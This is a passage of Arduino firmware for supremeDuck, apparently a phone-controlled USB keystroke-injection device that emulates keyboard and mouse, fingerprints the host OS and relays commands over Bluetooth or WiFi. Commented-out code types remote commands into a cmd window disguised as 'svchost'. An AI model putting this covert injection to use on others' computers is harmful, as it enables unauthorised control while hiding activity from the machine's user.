/*
supremeDuck project - https://github.com/michalmonday/supremeDuck
Created by Michal Borowski

Last edited: 02/03/2019
*/


#define APP_Version "1.22"                            // It is used to compare it with the mobile app version.
                                                     // For example: 1.08 is compatible with 1.081 or 1.83148, 
                                                     // but it's not compatible with 1.09 or 1.091319 
                                                     // (in such case notification will be displayed in the app)

// comment-out all to use standard bluetooth version (HC-06)                                                         
#define WIFI_DUCKY_SETUP                             // uncomment if you're using "Esp8266" (e.g. the same hardware/wiring as wifi_ducky)
//#define JDY_10_SETUP                                 // uncommend if using JDY-10 (BLE module), AT commands are followed by "carriage return" (\r) and "newline" (\n) bytes unlike JDY-08
//#define JDY_08_SETUP                                 // uncomment if you're using JDY-08 (BLE module) based version, JDY-08 (BLE) module 
                                                     // uses "AT+PASS" and 6 digits for setting pin (instead of "AT+PIN" and 4 digits like HC-06)
                                                     // and requires "AT+ISCEN1" to activate pairing password at all (password for pairing is 
                                                     // disabled by default because it's problematic)
                                                  

#if defined (WIFI_DUCKY_SETUP) || defined (JDY_08_SETUP) || defined (JDY_10_SETUP)
  #define USE_TX_RX_PINS                             //  TX/RX pins of pro micro instead of 9/8 pins and software serial library 
  #define MODULE_BAUDRATE 115200                     // use higher baudrate for Esp8266 (better speed for plain text/ducky scripts) 
#else
  #define MODULE_BAUDRATE 9600                          //(default baud rate of hc-06) It's the speed of communication between Arduino and HC-06, it shouldn't be changed without additionally changing it on the HC-06.
#endif
                                                                                               
#ifdef USE_TX_RX_PINS
  #define App Serial1                           
#else
  #include <SoftwareSerial.h>                  // Allows communication between the Arduino and HC-06 module using various I/O pins
  SoftwareSerial App(9, 8);                    // RX | TX these are pins responsible for communication between the bluetooth/wifi module and arduino
#endif

#include <EEPROM.h>                               // Electrically Erasable Programmable Read-Only Memory, it allows to save some values that will prevail even when the device is disconnected from power.
   
//#define WAIT_FOR_SERIAL_MONITOR_TO_OPEN 
           
#define LOG_SERIAL                            

/*
#define EEPROM_ADDRESS_TRIGGER_TRICK 0
trick = plug it in + plug out within 3 secs => special function is triggered(that special function is commented out in "setup" funciton)
*/
                                                  

#include "FingerprintUSBHost.h"                 // for recognizing operating system of the target PC (Windows, Linux, Mac)
#include "Keyboard.h"                           // library which provides all the functions to emulate Human Interface Device
#include "Mouse.h"                              // the same as above


#define MAX_SERIAL_LENGTH 200                     // Maximum lenght of data received from the bluetooth module. If you'd like to make it greater than 255 make sure to replace "byte" with "int" inside every "for loop"
char inSerial[MAX_SERIAL_LENGTH];                 //it will contain the text sent from bluetooth module and received in arduino

#define ENCODING_BYTE_DESIRED 0
#define ENCODING_BYTE_USED 1
#define ENCODING_BYTE_MODIFIER 2

/*
#define ENCODING_SIZE 72
byte Encoding[3][ENCODING_SIZE] = {               //definition only applies to new devices where encoding isn't saved at EEPROM yet. By default it's US keyboard encoding
  {0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x4D, 0x51, 0x57, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x69, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E},
  {0x31, 0x22, 0x33, 0x34, 0x35, 0x37, 0x22, 0x39, 0x30, 0x38, 0x3D, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3B, 0x3B, 0x2C, 0x3D, 0x2E, 0x2F, 0x32, 0x61, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x5B, 0x5C, 0x5D, 0x36, 0x2D, 0x7E, 0x61, 0x69, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x5B, 0x5C, 0x5D, 0x7E},
  {0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x00, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x81, 0x81, 0x81}
}; //saved at EEPROM 1-100, 101-200, 201-300
*/

#define ENCODING_SIZE 78
byte Encoding[3][ENCODING_SIZE] = {
    { 33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,77,81,87,89,90,91,92,93,94,95,96,97,105,109,113,119,121,122,123,124,125,126,127 },
    { 30,52,32,33,34,36,52,38,39,37,46,54,45,55,56,39,30,31,32,33,34,35,36,37,38,51,51,54,46,55,56,31,4,16,20,26,28,29,47,49,48,35,45,53,4,12,16,20,26,28,29,47,49,48,53,42 },
    { 2,2,2,2,2,2,0,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,2,0,2,2,2,2,2,2,2,2,2,0,0,0,2,2,0,0,0,0,0,0,0,0,2,2,2,2,0 },
};


/*
  How this project is using EEPROM space:
  0 - tricky activation for classic rubber ducky plug and execute method (deactivated/commented out, can't be bool, has to be some predefined int that normally would be unlikely to be there)
  1-300 - encoding
  301 - use multilang
  302-332 - encoding name
  333-363 - bluetooth name
  364-369 - bluetooth pin (4 digits)
  370-400 - BLE name
  401-408 - BLE pin (6 digits)

  1000 - requested BLE name change
  1004 - requested BLE pin change
  1008 - requested name change (after reboot, can't be bool, has to be some random pre-defined int)
  1012 - requested pin change
 */

#define EEPROM_ADDRESS_REQUESTED_BLE_NAME_CHANGE 1000
#define EEPROM_ADDRESS_REQUESTED_BLE_PIN_CHANGE 1004
#define EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE 1008
#define EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE 1012
#define EEPROM_ADDRESS_BLUETOOTH_NAME 333
#define BLUETOOTH_NAME_SIZE 30
#define EEPROM_ADDRESS_BLUETOOTH_PIN 364
#define EEPROM_ADDRESS_BLE_NAME 370
#define EEPROM_ADDRESS_BLE_PIN 401
#define BLE_NAME_SIZE 30

#define EEPROM_ADDRESS_ENCODING_AVAILABLE 1016                  // address at which "778" will be written when the device will receive its first instruction to use some other encoding than the default US (this way I'll know to load EEPROM instead of using default US after re-boot)
#define EEPROM_STARTING_ADDRESS_ENCODING_DESIRED 1 
#define EEPROM_STARTING_ADDRESS_ENCODING_USED 101
#define EEPROM_STARTING_ADDRESS_ENCODING_MODIFIER 201
bool useMultiLangWindowsMethod = true;                          // it's set to true but it will be reset after checking EEPROM which is done after turning on the device
#define EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS 301
#define EEPROM_STARTING_ADDRESS_ENCODING_NAME 302
#define ENCODING_NAME_SIZE 30

/*
 * keypad values copied from http://forum.arduino.cc/index.php?topic=266688.msg1880647#msg1880647
 * thanks to nickgammon's reply
 */

byte KEYPAD[10] = {234, 225, 226, 227, 228, 229, 230, 231, 232, 233};
unsigned long previousSendingTime = 0;                    // used for sending setting data updates to the phone (current keyboard encoding, multilang thing)
unsigned long lastOKsendingTime = 0;
char encodingName[ENCODING_NAME_SIZE] = {"US"};           // it will store the name of the currently used language encoding so it can be sent and displayed on the application (e.g  US, UK - gb, Deutch - ger, etc.)
//char commandLineObfuscationString[54] = "echo off & mode 20,1 & title svchost & color 78 & cls";                      // line used to make the command prompt less visible
void SetNewCharEncoding(char *inStr);
unsigned long last_alt_tab_time = 0;
#define ALT_TAB_AUTORELEASE 1000

/*
Default delay info: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript
"DEFAULT_DELAY or DEFAULTDELAY is used to define how long (milliseconds) to wait between each subsequent command. 
DEFAULT_DELAY must be issued at the beginning of the ducky script and is optional. Not specifying the DEFAULT_DELAY will result in faster execution of ducky scripts. 
This command is mostly useful when debugging."
*/
int default_delay = 0; 
byte keypress_time = 5;

String operating_system;

unsigned long last_led_activity = 0;
#define LED_SHOW_ACTIVITY_TIME 100

#define PROGRAMMING_MODE_SWITCH_PIN 3 // 3 of Arduino Pro Micro, SCL, PD0 (18 of Atmega32u4)
/*
Thanks to this switch it will be possible to flash the Esp8266 without the need to upload this code:
https://gist.github.com/spacehuhn/b2b7d897550bc07b26da8464fa7f4b36

It is incorporated into supremeDuck.ino instead and is activated when the switch is turned on = less hassle with reprogramming Esp

For BLE version it allows sending AT commands using "Tools -> Serial Monitor"
 */
#define WIFI_DUCKY_GPIO_0_CONTROL_PIN 2 // 2 of Arduino Pro Micro, SDA, PD1 (19 of Atmega32u4)
#define WIFI_DUCKY_ENABLE_CONTROL_PIN 20 // 20 of Arduino Pro Micro, A2, PF5 (38 of Atmega32u4)

void setup()                                    // setup function is a part of every Arduino sketch, it gets called once at the begining
{
  #ifdef LOG_SERIAL
    Serial.begin(115200);                           // begin serial communication so it's possible to use "Tools -> Serial Monitor" to see the debugging output
  #endif
  App.begin(MODULE_BAUDRATE);                  // begin communication with the wireless module

  #ifdef WAIT_FOR_SERIAL_MONITOR_TO_OPEN
    while(!Serial){
      ;
    }
  #endif
  
  Programming_mode();
  #ifdef WIFI_DUCKY_SETUP
    InitEsp();
  #endif
  
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  
  //Keyboard.begin();                           // begin emulating keyboard
  Keyboard.begin();
  Mouse.begin();                                // begin emulating mouse


  
  /*
  //TRIGGER TRICK
  //plug in and out within 3 sec to trigger some action at the next plug in
  byte triggerDefault = 0;
  EEPROM.get(EEPROM_ADDRESS_TRIGGER_TRICK, triggerDefault);
  byte c =1;
  EEPROM.put(EEPROM_ADDRESS_TRIGGER_TRICK, c);
  if(triggerDefault == 1)
  {
    //action
  }

  delay(3000);
  c =0;
  EEPROM.put(EEPROM_ADDRESS_TRIGGER_TRICK, c);  
  */  
  
  SavedEncodingAvailabilityCheck();             //rewrites the default US encoding with the saved one
  SavedMultiLangMethodWindowsCheck();           //checks whether to use the alt+numpad method

  #if !defined (WIFI_DUCKY_SETUP) && !defined (JDY_08_SETUP) && !defined (JDY_10_SETUP)
    ChangeBluetoothCheck();
  #endif

  #if defined (JDY_08_SETUP) || defined (JDY_10_SETUP)
    ChangeBLECheck();
  #endif

/*
  delay(1000);

  Keyboard.pressRawModifier(0x2);
  delay(50);
  Keyboard.pressRaw(0x64);
  delay(50);
  Keyboard.releaseAll();

  Keyboard.pressRawModifier(0x2);
  delay(50);
  Keyboard.pressRaw(0x64);
  delay(50);
  Keyboard.releaseAll();

  // 
  KeyReport kr = {0x0, 0, 
    {
      0x32, 0, 0, 0, 0, 0
    }
  };
  HID().SendReport(2, &kr, sizeof(KeyReport));
  delay(50);

  kr = {0, 0, 
    {
      0, 0, 0, 0, 0, 0
    }
  };
  HID().SendReport(2, &kr, sizeof(KeyReport));

*/
  delay(100); 
  digitalWrite(LED_BUILTIN, LOW);  
}

#ifdef WIFI_DUCKY_SETUP
void InitEsp(){
/*
This function is necessary for one reason: bug. For some reason sometimes Esp does not run the code. This function will make sure that Esp 
is actually running the code by resetting it if it isn't. (reseting is done by setting "EN"-controlling pin to LOW for a moment.
Keeping in mind that this bug happens rarely (around 1 in 15 plug-ins) I think that the solution will be effective (method was tested with separate code
to make sure that in the bug-occuring circumstances the reset method will actually result in code being run).
 */
  pinMode(WIFI_DUCKY_GPIO_0_CONTROL_PIN, OUTPUT);
  pinMode(WIFI_DUCKY_ENABLE_CONTROL_PIN, OUTPUT);
  
  // set esp to working mode
  digitalWrite(WIFI_DUCKY_GPIO_0_CONTROL_PIN,HIGH); delay(10);
  digitalWrite(WIFI_DUCKY_ENABLE_CONTROL_PIN,HIGH);
  delay(1500); // (esp blinks for 1 second at the start
  
  // clear serial
  App.setTimeout(100); // blocking time of readString

  bool esp_runs_code = false;
  while(!esp_runs_code){
    if(App.available()){App.readString();}
    
    // send control message
    App.print(":you_ok?");

    delay(300);
    
    if(App.available()){
      if(App.readString().equals("im_ok")){
        esp_runs_code = true;
        #ifdef LOG_SERIAL
          Serial.println("Esp runs");
        #endif
      }
    }else{
      #ifdef LOG_SERIAL
        Serial.println("Esp didn't respond, resetting.");
      #endif
    }

    if(!esp_runs_code){
      ResetEsp();
      delay(2000);
    }
  }
}

void ResetEsp(){
  App.end();
  digitalWrite(WIFI_DUCKY_ENABLE_CONTROL_PIN,LOW);
  delay(50);  
  digitalWrite(WIFI_DUCKY_ENABLE_CONTROL_PIN,HIGH);
  App.begin(MODULE_BAUDRATE);
  App.setTimeout(100);
}

#endif

void Programming_mode(){
  pinMode(PROGRAMMING_MODE_SWITCH_PIN, INPUT_PULLUP);

  if(digitalRead(PROGRAMMING_MODE_SWITCH_PIN) == LOW){
    // If switch was activated then pass all data through Serial1 and allow programming Esp8266 with "Nodemcu Flasher" program.
    // If the BLE version is used then it allows sending AT commands through "Tools -> Serial Monitor" 
    Serial1.begin(115200);
    Serial.begin(115200);
    
    pinMode(WIFI_DUCKY_GPIO_0_CONTROL_PIN, OUTPUT);
    pinMode(WIFI_DUCKY_ENABLE_CONTROL_PIN, OUTPUT);
  
    digitalWrite(WIFI_DUCKY_GPIO_0_CONTROL_PIN,LOW);
    digitalWrite(WIFI_DUCKY_ENABLE_CONTROL_PIN,HIGH);

    /* Flash LED 3 times quickly to show that the constant loop was reached and the Esp8266 can be programmed.
      Device is unusable in this mode (this mode is for flashing esp only) and has to be replugged in order to work again (plugged out + switch turned the other side + plugged back in) */
    digitalWrite(LED_BUILTIN, HIGH); delay(300); digitalWrite(LED_BUILTIN, LOW); delay(300); digitalWrite(LED_BUILTIN, HIGH); delay(300); digitalWrite(LED_BUILTIN, LOW); delay(300); digitalWrite(LED_BUILTIN, HIGH); delay(300); digitalWrite(LED_BUILTIN, LOW);

    while(true){
        while(Serial1.available()){
          Serial.write((uint8_t)Serial1.read());
        }
      
        if(Serial.available()){
          while(Serial.available()){
            Serial1.write((uint8_t)Serial.read());
          }
        }
    }
  }
}


void loop()                                   // loop function is also a part of every Arduino sketch but gets called over again after it returns/finishes unlike "setup" function
{ 
  LED_control();
  
  byte i=0; 
  if (App.available() > 0)               // check whether there's any data received by the bluetooth module
  {        
    unsigned long previousByteRec = millis(); unsigned long lastByteRec = millis();               // timing functions (needed for reliable reading of the BTserial)
    while (100 > lastByteRec - previousByteRec)                                                   // if no further character was received during 100ms then proceed with the amount of chars that were already received (notice that "previousByteRec" gets updated only if a new char is received)
    {      
      lastByteRec = millis();   
      while (App.available() > 0 && i < MAX_SERIAL_LENGTH-1) 
      {
        inSerial[i++]=App.read();                               // read bluetooth data (copy it to an array) 
        if(!inSerial[i-1]){i--; continue;}                           // JDY-08 sends byte equal to 0 after transmiting a message, 
                                                                // cool thing but HC-06 doesn't have such thing so this ugly check 
                                                                // is used instead of neat solution using "0" as terminating byte
                                                                
        /*char test[20] = {0};
        sprintf(test, "%d", inSerial[i-1]);
        Serial.println("ascii = " + String(test));
        */
        
        if(i == 16)                                                     // mouse movement check (only if the bluetooth receives exactly 16 characters)
        {
          //Serial.println("i = 16, inSerial = " + String(inSerial+1));
          if(StrStartsWith(inSerial, "MM:") && StrEndsWith(inSerial, ",end")){
              #ifdef LOG_SERIAL
                Serial.println(inSerial);
              #endif
              LED_show_activity();
              inSerial[i]='\0'; MyFuncMouseMove(inSerial);i = 0;
            }     //MM:L,U,3,1,end (mouse movement)}
        }
        previousByteRec = lastByteRec;
      }    
    }

    

    inSerial[i]= 0;                                     // end the string with 0
    #ifdef LOG_SERIAL
      Serial.write(inSerial);             //it's useful for checking what text arduino receives from android but it makes the mouse movement laggy if the serial monitor is closed
      Serial.write("\n");  
    #endif

    LED_show_activity();                     
    Check_Protocol(inSerial);                           // main checking function, all the functionality gets triggered there depending on what it received from the bluetooth module      
    App.print("OK");                               // it wasn't necessary before, but the ducky script functionality requires the Arduino to say: "OK, I already typed the last line/key you've sent me, so you can send the next one", otherwise there would have to be a bigger delay   
    lastOKsendingTime = millis();
  }
  

  /*
  unsigned long lastSendingTime = millis();             // needed to measure time and check when the last chunk of data was sent to mobile phone (it's a part of 2-way communication)
  if(lastSendingTime - previousSendingTime > 2500)      // send update to the mobile phone about the current language encoding and whether MultiLang method is used
  {
    if(lastSendingTime - lastOKsendingTime > 1000)      // additional check - if "OK" has been sent during the last second then avoid sending this data, just in case if there was further communication incomming
    {
      previousSendingTime = lastSendingTime;
      char data[40];
      sprintf(data,"data=%i,%s,end", useMultiLangWindowsMethod,encodingName);           //format string
      App.write(data);                                                             // send the data to the mobile app or any other bluetooth device that is connected to it right now
      memset(data, 0, 40);                                                              //reset "data" (idk if it's even necessary)
    }
  }
  */

  Alt_Tab_Release_Routine();
}

void LED_control(){
  if(digitalRead(LED_BUILTIN)){
    if(last_led_activity - millis() > LED_SHOW_ACTIVITY_TIME){
      digitalWrite(LED_BUILTIN, LOW);
    } 
  }
}

void LED_show_activity(){
  digitalWrite(LED_BUILTIN, HIGH);
  last_led_activity = millis();
}

void Alt_Tab_Release_Routine(){
  if(last_alt_tab_time > 0){
    if(millis() - last_alt_tab_time > ALT_TAB_AUTORELEASE){
      last_alt_tab_time =  0;
      Keyboard.releaseAll();
    }
  }
}

void SavedMultiLangMethodWindowsCheck()                   // check whether the MultiLang method was used before the device turned off last time (access EEPROM by using function "EEPROM.get(address, my_var);")
{
  EEPROM.get(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, useMultiLangWindowsMethod);                //read from EEPROM (persistent memory of ATMEGA 32U4) to see whether it should use MultiLang method
}

void SavedEncodingAvailabilityCheck()                               //rewrites the default US encoding with the one which was used last time and saved to EEPROM
{
  int numCheck = 0;                                                     //this has to be changed to int and saved elsewhere in the EEPROM, it has to be certain value so it won't give false positives
  EEPROM.get(EEPROM_ADDRESS_ENCODING_AVAILABLE, numCheck);
  if(numCheck == 778)
  {
    for(byte i=0;i<3; i++)
    {
      for(byte offset=0; offset<ENCODING_SIZE; offset++)
      {
        EEPROM.get(offset+1+(ENCODING_SIZE*i), Encoding[i][offset]);            //+1 because the 0 address holds trigger bool for tricky activation method
      }

    }

    EEPROM.get(EEPROM_STARTING_ADDRESS_ENCODING_NAME, encodingName);
  }
  else
  {

  }
}

void ChangeBluetoothCheck(){
  int numCheck = 0;

  
  EEPROM.get(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE, numCheck);
  if(numCheck == 777)
  {
    EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE, 0);
    char bluetoothName[BLUETOOTH_NAME_SIZE] = {0};
    //Serial.println(bluetoothName);
    EEPROM.get(EEPROM_ADDRESS_BLUETOOTH_NAME, bluetoothName);
    char at_cmd[BLUETOOTH_NAME_SIZE + 15] = {0};
    sprintf(at_cmd, "AT+NAME%s\0", bluetoothName);
    delay(700);
    
    App.print(at_cmd);
    
    
    delay(1000);
    #ifdef LOG_SERIAL
      if(App.available()){Serial.println("Changed bluetooth name (" + String(at_cmd) + "), response: " + App.readString());}
      while(App.available()){char c = App.read();}                // just to be sure there's no bytes left
    #else
      while(App.available()){char c = App.read();}
    #endif
  }

  numCheck = 0;
  
  EEPROM.get(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE, numCheck);
  if(numCheck == 777)
  {
    EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE, (int)0);
    char pin[5] = {0};
    EEPROM.get(EEPROM_ADDRESS_BLUETOOTH_PIN, pin);
    char at_pin_cmd[16] = {0};
    sprintf(at_pin_cmd, "AT+PIN%s\0", pin);
    delay(700);
    App.print(at_pin_cmd);

    delay(1000);
    
    #ifdef LOG_SERIAL
      if(App.available()){Serial.println("Changed bluetooth pin (" + String(at_pin_cmd) + "), response: " + App.readString());}
      while(App.available()){char c = App.read();}                // just to be sure there's no bytes left
    #else
      while(App.available()){char c = App.read();}
    #endif
  }
}

void ChangeBLECheck(){
  int numCheck = 0;

  
  EEPROM.get(EEPROM_ADDRESS_REQUESTED_BLE_NAME_CHANGE, numCheck);
  if(numCheck == 777)
  {
    EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLE_NAME_CHANGE, 0);
    char bleName[BLE_NAME_SIZE] = {0};
    EEPROM.get(EEPROM_ADDRESS_BLE_NAME, bleName);
    char at_cmd[BLE_NAME_SIZE + 17] = {0};
    
    #ifdef JDY_10_SETUP
      sprintf(at_cmd, "AT+NAME%s\r\n\0", bleName);
    #else                                                 // else JDY-08 (that doesn't use \r\n)
      sprintf(at_cmd, "AT+NAME%s\0", bleName);
    #endif
    
    delay(700);
    
    App.print(at_cmd);
    
    
    delay(1000);

    #ifdef LOG_SERIAL
      if(App.available()){Serial.println("Changed BLE name (" + String(at_cmd) + "), response: " + App.readString());}
      while(App.available()){char c = App.read();}                // just to be sure there's no bytes left
    #else
      while(App.available()){char c = App.read();}
    #endif
  }

  numCheck = 0;
  
  EEPROM.get(EEPROM_ADDRESS_REQUESTED_BLE_PIN_CHANGE, numCheck);
  if(numCheck == 777)
  {
    App.print("AT+ISCEN1");
    delay(1000);
    #ifdef LOG_SERIAL
      if(App.available()){Serial.println("AT+ISCEN1 (enable pin) was sent to BLE module, response: " + App.readString());}
      while(App.available()){char c = App.read();}                // just to be sure there's no bytes left
    #else
      while(App.available()){char c = App.read();}
    #endif
    
    EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLE_PIN_CHANGE, (int)0);
    char pin[7] = {0};
    EEPROM.get(EEPROM_ADDRESS_BLE_PIN, pin);
    char at_pin_cmd[20] = {0};
    #ifdef JDY_10_SETUP
      sprintf(at_pin_cmd, "AT+PASS%s\r\n\0", pin);
    #else                                                 // else JDY-08 (that doesn't use \r\n)
      sprintf(at_pin_cmd, "AT+PASS%s\0", pin);
    #endif
    delay(700);
    App.print(at_pin_cmd);
    
    delay(1000);
    #ifdef LOG_SERIAL
      if(App.available()){Serial.println("Changed BLE pin (" + String(at_pin_cmd) + "), response: " + App.readString());}
      while(App.available()){char c = App.read();}                // just to be sure there's no bytes left
    #else
      while(App.available()){char c = App.read();}
    #endif
  }
}


void MyFuncMouseMove(char *inStr)
{
  char x;
  char y;

  //MM:L,U,FF,FF,end
  char strValBuff[3]={inStr[7],inStr[8],'\0'}; 
  x = (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
   
  strValBuff[0]=inStr[10]; 
  strValBuff[1]=inStr[11]; 
  y = (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
  
 //MM:L,U,FF,FF,end //left/right, up/down, horizontal value, vertical value
  if(inStr[3] == 'L'){x = x * -1;}
  if(inStr[5] == 'D'){y = y * -1;}       

  
  Mouse.move(x, y, 0);
  
  for(byte i=0;i<strlen(inStr);i++){inStr[i]=0;}
}

void TypeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void OpenRun()
{
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(700);
}

void OpenCmd()
{
  OpenRun();  
  Print("cmd");
  TypeKey(KEY_RETURN); 
}

void EnterCommand(char *text)
{
  Print(text);
  delay(10);
  TypeKey(KEY_RETURN);  
}



void Check_Protocol(char *inStr)
{       

    if(!strcmp(inStr, "Request_info")){
      char data[70];
      
      FingerprintUSBHost.guessHostOS(operating_system);
      sprintf(data,"data=%i,%s,%s,end", useMultiLangWindowsMethod, encodingName, operating_system.c_str());           //format string
      App.write(data); // send the data to the mobile app or any other bluetooth device that is connected to it right now     
      Serial.println(data);
      memset(data, 0, 70);  
    }

    if(!strcmp(inStr, "Ctrl_alt_del")){
      Keyboard.releaseAll();
      delay(20);
      Keyboard.press(KEY_LEFT_CTRL);
      delay(20);
      Keyboard.press(KEY_LEFT_ALT);
      delay(20);
      Keyboard.press(KEY_DELETE);
      delay(200);
      Keyboard.releaseAll();
    }

    if(!strcmp(inStr, "Right_click")){
      Mouse.click(MOUSE_RIGHT);
    }


/*
    if(!strcmp(inStr, "Esc\0")){
      Keyboard.press(KEY_ESC);
      delay(20);
      Keyboard.releaseAll();
      
    }

    
    if(!strcmp(inStr, "Backspace\0")){
      Keyboard.press(KEY_BACKSPACE);
      delay(20);
      Keyboard.releaseAll();
    }*/

  
    if(!strcmp(inStr, "Disconnect\0")){
      delay(1000); 
      ChangeBluetoothCheck();
    }

    /*
    if(!strcmp(inStr, "Enter\0")){TypeKey(KEY_RETURN);}
    
    if(!strcmp(inStr, "Alt+F4\0")){
        Keyboard.press(KEY_LEFT_ALT);
        delay(10);
        Keyboard.press(KEY_F4);
        delay(50);
        Keyboard.releaseAll();
    }*/

    if(!strcmp(inStr, "Alt+Tab\0")){
        
        if(last_alt_tab_time == 0){
          Keyboard.press(KEY_LEFT_ALT);
          delay(50);
        }
        Keyboard.press(KEY_TAB);
        delay(50);
        Keyboard.release(KEY_TAB);
        last_alt_tab_time = millis();
    }

    /*
    if(!strcmp(inStr, "Increase font size")){
        Keyboard.press(KEY_LEFT_CTRL);
        delay(10);
        Keyboard.press(KEY_LEFT_SHIFT);
        delay(10);
        Keyboard.press('>');
        delay(50);
        Keyboard.releaseAll();  
    }
       
    if(!strcmp(inStr, "Decrease font size")){
        Keyboard.press(KEY_LEFT_CTRL);
        delay(10);
        Keyboard.press(KEY_LEFT_SHIFT);
        delay(10);
        Keyboard.press('<');
        delay(50);
        Keyboard.releaseAll();  
    }
    
    if(!strcmp(inStr, "Select all")){
        Keyboard.press(KEY_LEFT_CTRL);
        delay(10);
        Keyboard.press('a');
        delay(50);
        Keyboard.releaseAll();  
    }

    
    if(!strcmp(inStr, "Bold")){
        Keyboard.press(KEY_LEFT_CTRL);
        delay(10);
        Keyboard.press('b');
        delay(50);
        Keyboard.releaseAll(); 
    }
    
    if(!strcmp(inStr, "Underline")){
        Keyboard.press(KEY_LEFT_CTRL);
        delay(10);
        Keyboard.press('u');
        delay(50);
        Keyboard.releaseAll(); 
    }*/
    
    if(!strcmp(inStr, "click")){Mouse.click();}
    
    if(!strcmp(inStr, "VER")){                            // if the mobile phone app asks what version of the code is used on Arduino, to make sure that the same it's not different from the mobile app
        char data[13];
        sprintf(data,"ver=%s,end", APP_Version);          //format string
        App.write(data);                                  // send the data to the mobile app or any other bluetooth device that is connected to it right now
        memset(data, 0, 13);                              //reset "data" (idk if it's even necessary)
    }



    
  

    /* NOT NEEDED ANYMORE :)
    if(IsCmd(inStr, "YT:")){                       //YT:t,end (Youtube)
        ExtractDeliveredText(inStr, 3);
        OpenRun();
        //Print("www.youtube.com/embed/2Z4m4lnjxkY?rel=0&autoplay=1");        //trololo 2Z4m4lnjxkY  
        Print("www.youtube.com/embed/");
        Print(inStr);
        Print("?rel=0&autoplay=1");
        TypeKey(KEY_RETURN);   
    }
    */

/*
    if(IsCmd(inStr, "YTB:")){                      //youtube control buttons
        ExtractDeliveredText(inStr, 4);
        if(StrContains(inStr, "PP")){Print(" ");}                                                         //pause/play
        else if(StrContains(inStr, "F5")){Keyboard.press(KEY_RIGHT_ARROW);}                             //forward 5s // change inc/vol to 10 sec if it doesn't work and use Print("l/j")
        else if(StrContains(inStr, "B5")){Keyboard.press(KEY_LEFT_ARROW);}                              //backward 5s
        else if(StrContains(inStr, "GB")){Keyboard.press(KEY_HOME);}                                    //go to begining
        else if(StrContains(inStr, "GE")){Keyboard.press(KEY_END);}                                     //go to end
        else if(StrContains(inStr, "CA")){Print("c");}                                                    //captions tog
        else if(StrContains(inStr, "IS")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print(">");}       //increase speed (may not work in all browsers)
        else if(StrContains(inStr, "DS")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("<");}       //decrease speed
        else if(StrContains(inStr, "IV")){Keyboard.press(KEY_UP_ARROW);}                                //increase vol
        else if(StrContains(inStr, "DV")){Keyboard.press(KEY_DOWN_ARROW);}                              //decrease vol
        else if(StrContains(inStr, "PV")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("p");}       //previous video (in a playlist)
        else if(StrContains(inStr, "NV")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("n");}       //next video
        else if(StrContains(inStr, "FS")){Print("f");}                                                    //full screen tog
        else if(StrContains(inStr, "F11")){Keyboard.press(KEY_F11);}                                    //full screen browser tog
        delay (70);
        Keyboard.releaseAll();
    }
 */

    /*
    if(IsCmd(inStr, "WS:")){                     //WS:t,end (website)
        ExtractDeliveredText(inStr, 3);
        OpenRun();
        Print(inStr);
        TypeKey(KEY_RETURN); 
    }

    
    if(IsCmd(inStr, "EP:")){                     //EP:t,end (execute program)
        ExtractDeliveredText(inStr, 3);
        OpenRun();
        Print(inStr);
        delay(100);
        TypeKey(KEY_RETURN);  
    }
   
    if(IsCmd(inStr, "EC:")){                     //EC:t,end (execute command)
        ExtractDeliveredText(inStr, 3);
        OpenCmd();
        delay(500);
        EnterCommand(commandLineObfuscationString);
        Print(inStr);
        if(StrStartsWith(inStr, "cd \"%USERPROFILE%\\Desktop\" & FOR")){TypeKey(KEY_RETURN); delay(50); Print("echo a");}       //exception for a command which creates multiple files (otherwise only one file would be created, echo a is added because command " & exit" wouldn't close the window without something preceding it
        Print(" & exit");
        TypeKey(KEY_RETURN);  
        delay(100);
    }
    */
    
